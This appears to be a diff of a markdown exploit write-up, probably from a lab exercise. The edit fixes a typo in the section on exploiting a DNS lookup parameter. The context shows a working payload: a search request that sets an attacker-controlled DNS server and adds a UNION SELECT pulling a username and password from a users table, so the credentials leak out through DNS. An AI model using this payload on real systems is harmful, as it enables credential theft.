@@ -98,7 +98,7 @@ Indeed check logged queries on our DSN container
 	[+] Plain domain value: www.google.it
 
 ## 💥Exploitation 
-Knowing tha we can control the DNS parameter for nslookup and assuming that a users table is also present in the DB, we can use the following payload to obtain sensitive information:
+Knowing that we can control the DNS parameter for nslookup and assuming that a users table is also present in the DB - how could it be missing? 😊  - we can use the following payload to exfiltrate sensitive information:
 
 	/search?set-dns=172.20.53.53&id=1 UNION SELECT (SELECT username || '-' || password FROM users WHERE id=1)
  Check again the logged query
